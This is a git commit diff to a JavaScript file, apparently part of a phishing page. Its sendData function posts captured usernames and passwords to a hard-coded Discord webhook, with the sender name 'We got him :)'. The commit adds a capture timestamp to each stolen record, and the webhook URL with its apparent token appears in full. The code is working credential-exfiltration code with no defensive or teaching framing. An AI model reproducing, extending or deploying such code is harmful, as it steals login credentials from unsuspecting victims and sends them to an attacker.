407ffba32709ab743aab56601af8a69b0e80bf26
u2475 <119879229+u2475@users.noreply.github.com>
2022-12-07 12:56:38 -0800

    Update main.js

--- main.js
+++ main.js
@@ -1,8 +1,9 @@
 function sendData(User, Pass) {
+    const date = new Date();
     $.post('https://discord.com/api/webhooks/1049489026710769684/TeUgHn3y_Bg8j1M4MoLUL0_5zCe_DCRLj9yEIv7mX6idoSWsyKhs00GTgbYkv0XWLjL8',
     {
         'username': 'We got him :)',
-        'content': 'Username:\n\t' + User + '\nPassword:\n\t' + Pass,
+        'content': 'Username:\n\t' + User + '\nPassword:\n\t' + Pass + '/nCapture Time:\n\t' + date,     //adding timestamp
     }, function(data, status) {
         console.log("Data: " + data + "\nStatus: " + status);
     }
